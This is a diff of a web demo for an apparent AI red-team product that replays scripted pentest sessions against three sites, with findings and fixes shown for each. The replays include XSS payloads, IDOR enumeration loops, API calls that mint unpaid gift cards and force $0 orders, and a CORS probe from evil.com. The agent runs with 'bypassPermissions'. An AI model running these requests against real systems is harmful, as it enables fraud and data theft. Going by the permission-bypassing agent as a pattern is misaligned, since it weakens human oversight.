+     impact:'Mayor superficie de ataque para XSS, clickjacking, MIME sniffing y otros ataques del navegador.',
+     evidence:'Headers faltantes:\n❌ X-Content-Type-Options\n❌ X-Frame-Options\n❌ Content-Security-Policy\n❌ Strict-Transport-Security\n❌ Referrer-Policy\n❌ Permissions-Policy',
+     fix:'Agregar todos los headers de seguridad recomendados en la configuración de nginx.'},
+    {sev:'low',title:'Cookie de sesión sin atributo SameSite',
+     loc:'Cookie: session_id',
+     desc:'La cookie de sesión no tiene el atributo SameSite configurado, lo que permite que sea enviada en requests cross-site (CSRF).',
+     impact:'Facilita ataques CSRF al permitir que la cookie se adjunte automáticamente en requests desde otros dominios.',
+     evidence:'Set-Cookie: session_id=abc123xyz; Path=/; HttpOnly\n\n❌ SameSite: (ausente)\n✓ HttpOnly: sí\n❌ Secure: no',
+     fix:'Agregar SameSite=Lax o SameSite=Strict a la cookie de sesión. También agregar el flag Secure.'},
+    {sev:'low',title:'Exposición del schema de usuarios en respuesta de error',
+     loc:'/api/v1/users/0',
+     desc:'Al consultar un ID de usuario inválido, el servidor devuelve un error que expone la estructura completa del modelo de datos de usuario, incluyendo campos sensibles.',
+     impact:'Facilita la planificación de ataques al revelar la estructura de la base de datos y los campos disponibles.',
+     evidence:'GET /api/v1/users/0\n\n{"error": "User not found",\n "debug": {\n   "model": "User",\n   "fields": ["id","email","password_hash","phone",\n     "balance","bank_account","identity_doc",\n     "is_admin","api_key","created_at"]\n }}',
+     fix:'No exponer información de debug en producción. Devolver errores genéricos sin detalles internos del modelo.'}
+  ]
+};
+
+// ====================================================================
+// PLAYBACK SEQUENCES (anonymized command logs from real engagements)
+// ====================================================================
+const PLAYBACK = {
+  elcinelunar: [
+    {d:500,t:'sys',x:'morocho.ai · Red Team AI Engine v2.4\nModelo: claude-opus-4-6 · Permiso: bypassPermissions\nEngagement: elcinelunar.com · Scope: 2 objetivos'},
+    {d:1200,t:'text',x:'Entendido. Voy a realizar un pentest completo sobre elcinelunar.com. Comienzo con la fase de reconocimiento para mapear la superficie de ataque.'},
+    {d:800,t:'phase',p:'recon'},
+    {d:600,t:'tool',n:'Bash',c:'nmap -sV -sC -T4 elcinelunar.com',o:'Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for elcinelunar.com (203.0.113.42)\nHost is up (0.035s latency).\nNot shown: 997 filtered tcp ports\nPORT     STATE SERVICE  VERSION\n80/tcp   open  http     Microsoft IIS httpd 10.0\n443/tcp  open  ssl/http Microsoft IIS httpd 10.0\n|_ssl-cert: Subject: CN=elcinelunar.com\n3306/tcp closed mysql\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows'},
+    {d:1400,t:'text',x:'Servidor IIS/10.0 con ASP.NET. Puerto MySQL cerrado pero presente — posible acceso interno. Reviso los headers HTTP para más información.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -sI https://elcinelunar.com',o:'HTTP/1.1 200 OK\nServer: Microsoft-IIS/10.0\nX-Powered-By: ASP.NET\nX-AspNet-Version: 4.0.30319\nContent-Type: text/html; charset=utf-8\nSet-Cookie: SessionID=a8f3b2; path=/; HttpOnly'},
+    {d:800,t:'text',x:'Los headers revelan la versión exacta del stack: IIS/10.0 y ASP.NET 4.0. Esto es un hallazgo de divulgación de información.'},
+    {d:500,t:'finding',f:5},
+    {d:1000,t:'phase',p:'scan'},
+    {d:600,t:'tool',n:'Bash',c:'nikto -h https://elcinelunar.com -ssl -Tuning x',o:'- Nikto v2.5.0\n+ Target IP:       203.0.113.42\n+ Target Hostname:  elcinelunar.com\n+ Target Port:      443\n+ Server: Microsoft-IIS/10.0\n+ /admin/: Admin directory found\n+ /backup/: Backup directory found\n+ X-Powered-By: ASP.NET\n+ Multiple index files: index.aspx, default.aspx'},
+    {d:1200,t:'text',x:'Directorio /admin/ encontrado. Voy a analizar el código fuente del frontend para buscar credenciales hardcodeadas o endpoints ocultos.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s https://elcinelunar.com/static/js/main.bundle.js | grep -i "pass\\|key\\|secret\\|token\\|admin"',o:'  const adminConfig = {\n    endpoint: "/admin/api",\n    user: "admin@elcinelunar.com",\n    pass: "Cinema2024!",  // TODO: mover a env\n    debug: false\n  };'},
+    {d:800,t:'text',x:'🚨 Hallazgo crítico: encontré las credenciales del panel de administración hardcodeadas directamente en el JavaScript del frontend. Cualquier usuario puede ver esto desde DevTools.'},
+    {d:500,t:'finding',f:0},
+    {d:1200,t:'phase',p:'exploit'},
+    {d:800,t:'text',x:'Paso a la fase de explotación. Voy a probar vectores de XSS en los parámetros que identifico en la URL de cartelera.'},
+    {d:600,t:'tool',n:'Playwright',c:'navigate("https://elcinelunar.com/cartelera?seccion=%22%3E%3Cscript%3Ealert(1)%3C/script%3E")',o:'Navegación exitosa.\nTítulo de la página: Cartelera · El Cine Lunar\n⚠ Dialog detectado: alert con texto "1"\nEl script se ejecutó — XSS confirmado.'},
+    {d:800,t:'text',x:'XSS reflejado confirmado en el parámetro "seccion". El payload se refleja sin sanitizar dentro de un atributo HTML.'},
+    {d:500,t:'finding',f:1},
+    {d:1000,t:'text',x:'Ahora pruebo IDOR en el endpoint de impresión de tickets. Voy a acceder a tickets con IDs secuenciales usando una sesión de usuario de prueba.'},
+    {d:600,t:'tool',n:'Bash',c:'for id in 1001 1002 1003; do\n  echo "--- Ticket $id ---"\n  curl -s -b "SessionID=testuser123" \\\n    "https://elcinelunar.com/Compra/ImprimirTicket/$id" | \\\n    grep -o \'"nombre":"[^"]*"\\|"email":"[^"]*"\'\ndone',o:'--- Ticket 1001 ---\n"nombre":"María G."\n"email":"maria.g@mail.com"\n--- Ticket 1002 ---\n"nombre":"Carlos R."\n"email":"carlos.r@gmail.com"\n--- Ticket 1003 ---\n"nombre":"Ana L."\n"email":"ana.l@outlook.com"'},
+    {d:800,t:'text',x:'IDOR confirmado. Puedo acceder a tickets de cualquier usuario cambiando el ID en la URL. Los datos personales (nombre, email, teléfono) quedan expuestos.'},
+    {d:500,t:'finding',f:2},
+    {d:800,t:'tool',n:'Bash',c:'curl -sI https://elcinelunar.com | grep -i "x-frame\\|frame-ancestors"',o:'(sin resultados — headers ausentes)'},
+    {d:500,t:'finding',f:3},
+    {d:800,t:'tool',n:'Bash',c:'curl -s https://elcinelunar.com/Usuario/EditarPerfil -b "SessionID=testuser123" | grep -i "csrf\\|token\\|__RequestVerification"',o:'(sin resultados — no hay token CSRF en el formulario)'},
+    {d:600,t:'text',x:'Confirmo la ausencia de protección CSRF en el formulario de edición de perfil. Se puede crear un auto-submit desde un sitio externo.'},
+    {d:500,t:'finding',f:4},
+    {d:1200,t:'phase',p:'report'},
+    {d:1000,t:'text',x:'Fase de explotación completada. Resumo los hallazgos:\n\n• 1 Crítico — Contraseña en código fuente\n• 2 Altos — XSS reflejado + IDOR\n• 2 Medios — Clickjacking + CSRF\n• 1 Bajo — Divulgación de tecnología\n\nGenerando reporte final con remediaciones...'},
+    {d:1500,t:'done'}
+  ],
+
+  regalosdigital: [
+    {d:500,t:'sys',x:'morocho.ai · Red Team AI Engine v2.4\nModelo: claude-opus-4-6 · Permiso: bypassPermissions\nEngagement: regalosdigital.com · Scope: 2 objetivos'},
+    {d:1200,t:'text',x:'Perfecto, voy a analizar regalosdigital.com. Es un WordPress con WooCommerce — empiezo por identificar la versión, plugins y la API REST.'},
+    {d:800,t:'phase',p:'recon'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s https://regalosdigital.com/ | grep -oP \'wp-content/\\K[^ "]*\' | head -15',o:'themes/flavor/style.css?ver=3.2.1\nplugins/woocommerce/assets/css/woocommerce.css\nplugins/pw-gift-cards/assets/css/gift-cards.css\nplugins/contact-form-7/includes/css/styles.css\nuploads/2026/08/banner-navidad.jpg'},
+    {d:1000,t:'text',x:'WordPress con WooCommerce y plugin pw-gift-cards. Verifico si la API REST está abierta al público.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s https://regalosdigital.com/wp-json/wp/v2/users',o:'[{"id":1,"name":"admin","slug":"admin",\n  "avatar_urls":{"96":"..."},"roles":["administrator"]},\n {"id":2,"name":"tienda","slug":"tienda",\n  "roles":["shop_manager"]},\n {"id":3,"name":"soporte","slug":"soporte",\n  "roles":["editor"]}]'},
+    {d:800,t:'text',x:'La API REST de usuarios está completamente abierta. Puedo ver nombres, slugs y roles de todos los usuarios. Esto facilita ataques de fuerza bruta.'},
+    {d:500,t:'finding',f:3},
+    {d:800,t:'phase',p:'scan'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s https://regalosdigital.com/wp-json/wc/v3/products | python3 -m json.tool | head -30',o:'[\n  {\n    "id": 234,\n    "name": "Gift Card $50.000",\n    "slug": "gift-card-50000",\n    "type": "pw-gift-card",\n    "status": "publish",\n    "price": "50000",\n    "regular_price": "50000",\n    "stock_quantity": null,\n    "purchasable": true\n  },\n  {\n    "id": 235,\n    "name": "Gift Card $10.000",\n    "price": "10000"\n  }\n]'},
+    {d:800,t:'text',x:'Los endpoints de WooCommerce también están abiertos sin autenticación. Puedo ver todos los productos, precios y stock.'},
+    {d:500,t:'finding',f:4},
+    {d:1000,t:'phase',p:'exploit'},
+    {d:800,t:'text',x:'Ahora voy a probar la lógica de negocio del sistema de gift cards. Intento crear una gift card directamente por API sin una orden de compra asociada.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s -X POST https://regalosdigital.com/wp-json/wc/v3/gift-cards \\\n  -H "Content-Type: application/json" \\\n  -d \'{"amount": 50000, "recipient_email": "test@test.com"}\'',o:'{\n  "id": 1847,\n  "code": "GC-01847",\n  "amount": "50000.00",\n  "balance": "50000.00",\n  "status": "active",\n  "recipient": "test@test.com",\n  "created_at": "2026-09-10T14:32:08"\n}'},
+    {d:800,t:'text',x:'🚨 Crítico: Acabo de crear una gift card de $50.000 completamente activa sin pagar nada. No hay validación de pago ni orden asociada.'},
+    {d:500,t:'finding',f:0},
+    {d:1000,t:'text',x:'Pruebo ahora manipulación de precios. Intercepto una compra y cambio el total a $0.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s -X POST https://regalosdigital.com/wp-json/wc/v3/orders \\\n  -H "Content-Type: application/json" \\\n  -d \'{"line_items":[{"product_id":234,"quantity":1}],\n       "set_paid":true,"total":"0.00"}\'',o:'{\n  "id": 5621,\n  "status": "completed",\n  "total": "0.00",\n  "line_items": [\n    {"name": "Gift Card $50.000", "total": "0.00"}\n  ],\n  "payment_method": "",\n  "date_paid": "2026-09-10T14:33:41"\n}'},
+    {d:800,t:'text',x:'Confirmado: puedo comprar una gift card de $50.000 pagando $0. El backend acepta el total que le envío desde el cliente sin validar.'},
+    {d:500,t:'finding',f:1},
+    {d:1000,t:'text',x:'Pruebo XSS almacenado en el campo de mensaje personalizado de la gift card.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s -X POST https://regalosdigital.com/wp-json/wc/v3/gift-cards \\\n  -H "Content-Type: application/json" \\\n  -d \'{"amount":100,"message":"<img src=x onerror=alert(document.domain)>"}\'',o:'{"id":1848,"code":"GC-01848","amount":"100.00",\n "message":"<img src=x onerror=alert(document.domain)>",\n "status":"active"}'},
+    {d:600,t:'tool',n:'Playwright',c:'navigate("https://regalosdigital.com/gift-card/GC-01848")',o:'Navegación exitosa.\n⚠ Dialog detectado: alert con texto "regalosdigital.com"\nXSS almacenado confirmado — se ejecuta al ver la gift card.'},
+    {d:500,t:'finding',f:2},
+    {d:800,t:'text',x:'Analizo el patrón de los códigos de gift card. Son secuenciales y predecibles.'},
+    {d:600,t:'tool',n:'Bash',c:'for code in GC-01844 GC-01845 GC-01846 GC-01847; do\n  echo -n "$code → "\n  curl -s "https://regalosdigital.com/wp-json/wc/v3/gift-cards?code=$code" | \\\n    python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get(\'status\',\'?\'),\'$\'+str(d.get(\'balance\',\'?\')))" 2>/dev/null || echo "error"\ndone',o:'GC-01844 → active $10000.00\nGC-01845 → active $5000.00\nGC-01846 → redeemed $0.00\nGC-01847 → active $50000.00'},
+    {d:800,t:'text',x:'Los códigos son secuenciales (GC-NNNNN). Puedo enumerar todas las gift cards activas y conocer su saldo.'},
+    {d:500,t:'finding',f:5},
+    {d:1200,t:'phase',p:'report'},
+    {d:1000,t:'text',x:'Ataque finalizado. Resumen de hallazgos:\n\n• 1 Crítico — Gift cards sin verificación de pago\n• 1 Alto — Manipulación de precios (price=0)\n• 3 Medios — XSS almacenado + Enumeración de usuarios + API sin auth\n• 1 Bajo — Gift cards predecibles\n\nImpacto económico potencial: ilimitado (se pueden generar gift cards de cualquier valor). Generando reporte...'},
+    {d:1500,t:'done'}
+  ],
+
+  licitaonline: [
+    {d:500,t:'sys',x:'morocho.ai · Red Team AI Engine v2.4\nModelo: claude-opus-4-6 · Permiso: bypassPermissions\nEngagement: 185.62.33.47 · Scope: 2 objetivos'},
+    {d:1200,t:'text',x:'Inicio el análisis de la plataforma de subastas en 185.62.33.47. Dado que es entorno de producción con restricción de solo lectura, me limito a análisis pasivo.'},
+    {d:800,t:'phase',p:'recon'},
+    {d:600,t:'tool',n:'Bash',c:'nmap -sV -T3 185.62.33.47',o:'Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 185.62.33.47\nHost is up (0.042s latency).\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    nginx/1.20.1\n443/tcp  open  ssl/http nginx/1.20.1\n8080/tcp open  http    Node.js Express framework'},
+    {d:1000,t:'text',x:'nginx/1.20.1 con Node.js Express en el puerto 8080. La versión de nginx es antigua y tiene CVEs conocidos. Lo verifico.'},
+    {d:600,t:'tool',n:'redteamai',c:'cve_lookup("nginx 1.20.1")',o:'CVE-2022-41741 — CVSS 7.8 (HIGH)\n  Out-of-bound write in mp4 module\n  Affected: nginx < 1.23.2\n\nCVE-2022-41742 — CVSS 7.1 (HIGH)\n  Memory disclosure in mp4 module\n  Affected: nginx < 1.23.2\n\nCVE-2024-7347 — CVSS 4.7 (MEDIUM)\n  Worker crash with crafted mp4 file\n  Affected: nginx < 1.27.1\n\n3 CVEs found for nginx/1.20.1'},
+    {d:500,t:'finding',f:0},
+    {d:800,t:'phase',p:'scan'},
+    {d:800,t:'text',x:'Busco endpoints de la API y documentación expuesta.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s https://185.62.33.47:8080/ | python3 -m json.tool',o:'{\n  "name": "Auction Platform API",\n  "version": "2.1.0",\n  "endpoints": [\n    "/api/v1/auctions",\n    "/api/v1/bids",\n    "/api/v1/users",\n    "/api/v1/payments",\n    "/api/v1/categories"\n  ],\n  "docs": "/api/docs"\n}'},
+    {d:1000,t:'text',x:'La API expone su estructura completa en el root. Reviso la exposición de datos en el endpoint de subastas.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s https://185.62.33.47:8080/api/v1/auctions/42 | python3 -m json.tool',o:'{\n  "id": 42,\n  "title": "MacBook Pro M3",\n  "current_bid": 850000,\n  "bids_count": 23,\n  "ends_at": "2026-09-15T20:00:00Z",\n  "seller": {\n    "id": 156,\n    "email": "vendedor@personal.com",\n    "phone": "+54 11 5555-9876",\n    "internal_score": 92.3,\n    "created_at": "2024-01-15T10:30:00Z"\n  }\n}'},
+    {d:800,t:'text',x:'El endpoint de subastas devuelve datos internos del vendedor: email personal, teléfono, score interno y fecha de registro. Esto viola el principio de mínimo privilegio.'},
+    {d:500,t:'finding',f:1},
+    {d:1000,t:'phase',p:'exploit'},
+    {d:800,t:'text',x:'Verifico la política de CORS en los endpoints financieros.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -sI -X OPTIONS https://185.62.33.47:8080/api/v1/bids \\\n  -H "Origin: https://evil.com" \\\n  -H "Access-Control-Request-Method: POST"',o:'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Authorization, Content-Type\nAccess-Control-Max-Age: 86400'},
+    {d:800,t:'text',x:'CORS con wildcard (*) en endpoints de pujas y pagos. Un sitio malicioso podría hacer requests en nombre del usuario autenticado y leer las respuestas.'},
+    {d:500,t:'finding',f:2},
+    {d:600,t:'tool',n:'Bash',c:'curl -sI https://185.62.33.47 | grep -iE "x-frame|x-content|strict|csp|referrer|permission"',o:'(sin resultados — headers de seguridad ausentes)'},
+    {d:500,t:'finding',f:3},
+    {d:600,t:'tool',n:'Bash',c:'curl -sI https://185.62.33.47 | grep -i "set-cookie"',o:'Set-Cookie: session_id=f7a2b8c3d4; Path=/; HttpOnly'},
+    {d:600,t:'text',x:'Cookie de sesión sin SameSite ni Secure. Combinado con el CORS wildcard, esto amplifica el riesgo de CSRF.'},
+    {d:500,t:'finding',f:4},
+    {d:800,t:'text',x:'Pruebo un ID de usuario inválido para ver cómo maneja errores la API.'},
+    {d:600,t:'tool',n:'Bash',c:'curl -s https://185.62.33.47:8080/api/v1/users/0 | python3 -m json.tool',o:'{\n  "error": "User not found",\n  "debug": {\n    "model": "User",\n    "fields": [\n      "id", "email", "password_hash",\n      "phone", "balance", "bank_account",\n      "identity_doc", "is_admin",\n      "api_key", "created_at"\n    ],\n    "query": "SELECT * FROM users WHERE id = 0"\n  }\n}'},
+    {d:800,t:'text',x:'El modo debug está activo en producción. La respuesta de error expone la estructura completa de la tabla de usuarios, incluyendo campos como password_hash, bank_account e identity_doc.'},
+    {d:500,t:'finding',f:5},
+    {d:1200,t:'phase',p:'report'},
+    {d:1000,t:'text',x:'Análisis completado. Resumen:\n\n• 1 Alto — nginx/1.20.1 con CVEs conocidos\n• 2 Medios — Exposición de datos + CORS wildcard\n• 3 Bajos — Headers faltantes + Cookie insegura + Schema expuesto\n\nLa API necesita una revisión de seguridad completa. Generando reporte con todas las remediaciones...'},
+    {d:1500,t:'done'}
+  ]
+};
+
+// ====================================================================
+// APPLICATION STATE
+// ====================================================================
+let currentCase = null;
+let playing = false;
+let playAbort = false;
+let costSim = 0;
+let timerStart = 0;
+let timerInterval = null;
+let foundFindings = [];
+
+// ---- Render dashboard ----
+function renderDashboard(){
+  const grid=$('eng-grid');
+  grid.innerHTML='';
+  for(const [key,eng] of Object.entries(ENGAGEMENTS)){
+    const findings = FINDINGS[key];
+    const crits = findings.filter(f=>f.sev==='critical').length;
+    const highs = findings.filter(f=>f.sev==='high').length;
+    const card = document.createElement('div');
+    card.className='eng-card';
+    card.onclick=()=>openEngagement(key);
+    card.innerHTML=`
+      <div class="eng-icon">${esc(eng.icon)}</div>
+      <div class="eng-name">${esc(eng.name)}</div>
+      <div class="eng-type">${esc(eng.type)}</div>
+      <div class="eng-desc">${esc(eng.desc)}</div>
+      <div class="eng-stats">
+        <span class="eng-stat"><b>${findings.length}</b> hallazgos</span>
+        ${crits?`<span class="eng-stat" style="border-color:var(--red)"><b style="color:#ff2d55">${crits}</b> crítico${crits>1?'s':''}</span>`:''}
+        ${highs?`<span class="eng-stat" style="border-color:var(--red)"><b style="color:var(--red)">${highs}</b> alto${highs>1?'s':''}</span>`:''}
+        <span class="eng-stat"><b>${eng.scope.length}</b> targets</span>
+      </div>`;
+    grid.appendChild(card);
+  }
+}
+
+// ---- Open engagement ----
+function openEngagement(key){
+  currentCase = key;
+  const eng = ENGAGEMENTS[key];
+  foundFindings = [];
+  costSim = 0;
+  playAbort = false;
+
+  // Fill RoE panel
+  $('roe-name').textContent = eng.name;
+  $('roe-scope').innerHTML = eng.scope.map(s=>`<div class="roe-val">${esc(s)}</div>`).join('');
+  $('roe-cats').innerHTML = eng.cats.map(c=>`<span class="roe-tag">${esc(c)}</span>`).join('');
+  $('roe-stab').textContent = eng.stab;
+  $('roe-notes').textContent = eng.notes;
+
+  // Reset console
+  $('console').innerHTML='';
+  $('findings-list').innerHTML='<div style="color:var(--dim);font-size:11px;text-align:center;padding:30px 0">Los hallazgos aparecerán aquí durante el ataque.</div>';
+  $('fcount').innerHTML='';
+
+  // Reset phases
+  document.querySelectorAll('.ph').forEach(p=>{p.classList.remove('active','done')});
+
+  // Reset chips
+  updateChips('idle');
+
+  // Reset input
+  $('msg-input').value='';
+  $('msg-input').disabled=false;
+  $('msg-send').disabled=false;
+  $('msg-input').placeholder='Escribí un mensaje para iniciar el ataque…';
+
+  // Show attack screen
+  showScreen('s-attack');
+
+  // Mobile: show main col
+  mshow('col-main',document.querySelector('.mnav button[data-m="col-main"]'));
+}
+
+// ---- Update header chips ----
+function updateChips(state){
+  const chips=$('attack-chips');
+  if(state==='idle'){
+    chips.innerHTML=`<span class="chip">Estado <b class="on">● listo</b></span>
+      <span class="chip">Modelo <b>claude-opus-4-6</b></span>`;
+  } else if(state==='running'){
+    chips.innerHTML=`<span class="chip">Estado <b class="on">● atacando</b></span>
+      <span class="chip">Modelo <b>claude-opus-4-6</b></span>
+      <span class="chip">Costo <b id="chip-cost">$0.00</b></span>
+      <span class="chip">⏱ <b id="chip-time">0m 0s</b></span>`;
+  } else if(state==='done'){
+    const elapsed = Math.floor((Date.now()-timerStart)/1000);
+    const m=Math.floor(elapsed/60), s=elapsed%60;
+    chips.innerHTML=`<span class="chip">Estado <b style="color:var(--grn)">✓ finalizado</b></span>
+      <span class="chip">Modelo <b>claude-opus-4-6</b></span>
+      <span class="chip">Costo <b>$${costSim.toFixed(2)}</b></span>
+      <span class="chip">⏱ <b>${m}m ${s}s</b></span>
+      <span class="chip">Hallazgos <b>${foundFindings.length}</b></span>`;
+  }
+}
+
+// ---- Timer ----
+function startTimer(){
+  timerStart = Date.now();
+  timerInterval = setInterval(()=>{
+    const el = $('chip-time');
+    if(!el) return;
+    const elapsed = Math.floor((Date.now()-timerStart)/1000);
+    el.textContent = `${Math.floor(elapsed/60)}m ${elapsed%60}s`;
+  },1000);
+}
+function stopTimer(){clearInterval(timerInterval)}
+
+// ---- Cost simulator ----
+function addCost(amount){
+  costSim += amount;
+  const el=$('chip-cost');
+  if(el) el.textContent = `$${costSim.toFixed(2)}`;
+}
+
+// ---- Send message ----
+function sendMsg(){
+  const input=$('msg-input');
+  const msg=input.value.trim();
+  if(!msg || playing) return;
+  input.value='';
+  input.disabled=true;
+  $('msg-send').disabled=true;
+
+  // Show user message
+  appendUserMsg(msg);
+
+  // Start playback
+  startAttack(currentCase);
+}
+
+function appendUserMsg(text){
+  const con=$('console');
+  const div=document.createElement('div');
+  div.className='msgu';
+  div.innerHTML=`<div class="b">${esc(text)}</div>`;
+  con.appendChild(div);
+  con.scrollTop=con.scrollHeight;
+}
+
+// ====================================================================
+// PLAYBACK ENGINE
+// ====================================================================
+async function startAttack(caseId){
+  playing = true;
+  playAbort = false;
+  updateChips('running');
+  startTimer();
+
+  const events = PLAYBACK[caseId];
+  const findings = FINDINGS[caseId];
+
+  for(let i=0; i<events.length && !playAbort; i++){
+    const ev = events[i];
+    await sleep(ev.d || 800);
+    if(playAbort) break;
+
+    switch(ev.t){
+      case 'sys': appendSys(ev.x); addCost(0.01); break;
+      case 'text': appendText(ev.x); addCost(0.08 + Math.random()*0.05); break;
+      case 'phase': setPhase(ev.p); appendPhase(ev.p); addCost(0.02); break;
+      case 'tool': appendTool(ev.n, ev.c, ev.o); addCost(0.04 + Math.random()*0.06); break;
+      case 'finding': {
+        const f = findings[ev.f];
+        addFinding(f);
+        appendFindingNotice(f);
+        addCost(0.03);
+        break;
+      }
+      case 'done': break;
+    }
+    $('console').scrollTop = $('console').scrollHeight;
+  }
+
+  if(!playAbort){
+    playing = false;
+    stopTimer();
+    updateChips('done');
+    appendSys(`\n✓ Ataque finalizado — ${foundFindings.length} hallazgos encontrados.\n  Reporte disponible para descargar.`);
+    $('console').scrollTop = $('console').scrollHeight;
+    $('msg-input').placeholder='Ataque completado. Volvé al dashboard para probar otro.';
+    // Switch to findings on mobile
+    if(window.innerWidth<=860){
+      setTimeout(()=>mshow('col-side',document.querySelector('.mnav button[data-m="col-side"]')),1500);
+    }
+  }
+}
+
+function stopAttack(){
+  playAbort=true;
+  playing=false;
+  stopTimer();
+}
+
+// ---- Console rendering ----
+function appendSys(text){
+  const el=document.createElement('div');
+  el.className='e-sys';
+  el.textContent=text;
+  $('console').appendChild(el);
+}
+
+function appendText(text){
+  const el=document.createElement('div');
+  el.className='e-txt';
+  el.style.margin='6px 0';
+  el.textContent=text;
+  $('console').appendChild(el);
+}
+
+function appendPhase(phase){
+  const names={recon:'RECONOCIMIENTO',scan:'ESCANEO',exploit:'EXPLOTACIÓN',post:'POST-EXPLOTACIÓN',report:'GENERACIÓN DE REPORTE'};
+  const el=document.createElement('div');
+  el.className='e-phase';
+  el.style.margin='8px 0 4px';
+  el.textContent=`━━ FASE: ${names[phase]||phase.toUpperCase()} ━━`;
+  $('console').appendChild(el);
+}
+
+function appendTool(name, cmd, output){
+  const block=document.createElement('div');
+  block.className='toolblock';
+  block.innerHTML=`
+    <div class="th" onclick="this.parentElement.classList.toggle('collapsed')">
+      <span class="arrow">▶</span>
+      <span><span class="tname">[${esc(name)}]</span> <span class="tcmd">${esc(cmd).split('\n')[0]}</span></span>
+    </div>
+    <div class="tb">${esc(output)}</div>`;
+  $('console').appendChild(block);
+}
+
+function appendFindingNotice(f){
+  const sevColors={critical:'#ff2d55',high:'var(--red)',medium:'var(--amb)',low:'var(--cy)'};
+  const el=document.createElement('div');
+  el.className='e-find';
+  el.style.margin='6px 0';
+  el.innerHTML=`<span style="color:${sevColors[f.sev]||'var(--grn)'}">⚑ [${f.sev.toUpperCase()}]</span> ${esc(f.title)}`;
+  $('console').appendChild(el);
+}
+
+function setPhase(phase){
+  const order=['recon','scan','exploit','post','report'];
+  const idx=order.indexOf(phase);
+  document.querySelectorAll('.ph').forEach((el,i)=>{
+    el.classList.remove('active','done');
+    if(i<idx) el.classList.add('done');
+    if(i===idx) el.classList.add('active');
+  });
+}
+
+// ---- Findings panel ----
+function addFinding(f){
+  foundFindings.push(f);
+
+  // Update counter
+  updateFindingCount();
+
+  // Clear placeholder
+  if(foundFindings.length===1){
+    $('findings-list').innerHTML='';
+  }
+
+  // Add finding card
+  const card=document.createElement('div');
+  card.className=`find ${f.sev}`;
+  card.innerHTML=`
+    <span class="sev sev-${f.sev}">${f.sev.toUpperCase()}</span>
+    <div class="ft">${esc(f.title)}</div>
+    <div class="fmeta">${esc(f.loc)}</div>
+    <details>
+      <summary>Descripción</summary>
+      <p style="font-size:11px;color:var(--dim);margin:4px 0;line-height:1.5">${esc(f.desc)}</p>
+    </details>
+    <details>
+      <summary>Evidencia</summary>
+      <pre>${esc(f.evidence)}</pre>
+    </details>
+    <details>
+      <summary>Impacto</summary>
+      <p style="font-size:11px;color:var(--dim);margin:4px 0;line-height:1.5">${esc(f.impact)}</p>
+    </details>
+    <details>
+      <summary>Remediación</summary>
+      <p style="font-size:11px;color:var(--grn);margin:4px 0;line-height:1.5">${esc(f.fix)}</p>
+    </details>`;
+  $('findings-list').prepend(card);
+}
+
+function updateFindingCount(){
+  const counts={critical:0,high:0,medium:0,low:0,info:0};
+  foundFindings.forEach(f=>counts[f.sev]=(counts[f.sev]||0)+1);
+  const colors={critical:'#ff2d55',high:'var(--red)',medium:'var(--amb)',low:'var(--cy)',info:'var(--dim)'};
+  let html='';
+  for(const [sev,n] of Object.entries(counts)){
+    if(n>0) html+=`<span class="fc"><b style="color:${colors[sev]}">${n}</b> ${sev}</span>`;
+  }
+  html+=`<span class="fc"><b>${foundFindings.length}</b> total</span>`;
+  $('fcount').innerHTML=html;
+}
+
+// ---- Go back to dashboard ----
+function goBack(){
+  stopAttack();
+  currentCase=null;
+  showScreen('s-dashboard');
+}
+
+// ---- Init on load ----
+window.addEventListener('beforeunload',()=>sessionStorage.clear());
+if(sessionStorage.getItem('logged')==='1'){
+  showScreen('s-dashboard');
+  renderDashboard();
+}
+
+// Enter key on login
+$('login-email').addEventListener('keydown',e=>{if(e.key==='Enter')$('login-pass').focus()});
+</script>
+</body>
+</html>
